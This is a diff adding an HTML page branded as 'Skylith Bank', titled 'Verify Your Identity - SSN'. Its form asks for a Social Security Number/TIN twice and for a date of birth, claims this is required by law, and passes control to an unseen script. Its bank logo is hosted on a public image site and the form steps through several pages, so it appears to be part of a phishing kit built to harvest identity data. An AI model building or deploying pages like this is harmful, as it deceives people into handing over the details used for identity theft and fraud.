@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify Your Identity - SSN</title>
+  <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+  <div class="container">
+    <div class="banner">
+      <img src="https://i.postimg.cc/3rqWgGsg/logo.webp" alt="Skylith Bank">
+    </div>
+    <h1>Verify Your Identity</h1>
+    <p>We're required by law to collect your Social Security Number / TIN.</p>
+
+    <form id="ssnForm">
+      <label for="ssn">Social Security Number / TIN:</label>
+      <input type="text" id="ssn" name="ssn" required>
+
+      <label for="confirmSSN">Confirm SSN / TIN:</label>
+      <input type="text" id="confirmSSN" name="confirmSSN" required>
+
+      <label for="dob">Date of Birth:</label>
+      <input type="date" id="dob" name="dob" required>
+
+      <div class="button-group">
+        <button type="button" id="prevPage">Previous</button>
+        <button type="button" id="nextPage">Next</button>
+      </div>
+    </form>
+  </div>
+  <script src="js/script.js"></script>
+</body>
+</html>
